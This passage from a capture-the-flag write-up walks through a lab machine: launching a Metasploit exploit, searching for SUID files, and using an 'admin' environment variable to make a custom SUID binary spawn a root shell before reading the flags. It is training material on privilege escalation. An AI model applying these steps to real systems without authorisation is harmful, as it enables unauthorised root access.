Even though this said you could do this room right after the web-enumeration room I had a hard time.

I am not quite sure how they got the metasploit to search for crop-image
```

Now just set the options (USERNAME, PASSWORD, RHOSTS, LHOST) and exploit!

We can run 'shell' now and take a look on what's going on inside the machine. We have two goals: the files user.txt and root.txt. If we do a find on the machine:

```
$ find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt

$ cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```
bummer
```
find / -perm -u=s -type f 2>/dev/null
```
We have some common files, BUT there is an interesting one... /usr/sbin/checker. Never heard of this one. After checking on GTFOBins, we are sure that this is not a usual binary. Hmmmm... Let's take a look on how this thing works.
```
$ ls -la /usr/sbin/checker     
-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
```
So it is a root owned binary, with SUID flag on. What happens when we run it?
```
$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```
So it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?
```
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```
Oh, so now it tries to run bash! And since this is owned by root, it'll run bash as root! SWEET!
```
$ checker
$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Let's try again that stuff to find the user flag:
```
$ find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
/media/usb/user.txt
```
Oh, it was there!
```
$ cat /media/usb/user.txt
<REDACTED>
```
the root flag:
```
$ cat /root/root.txt
<REDACTED>
```

> **&#9432;** One thing I learned was the find command and I should learn how to use this better in linux.
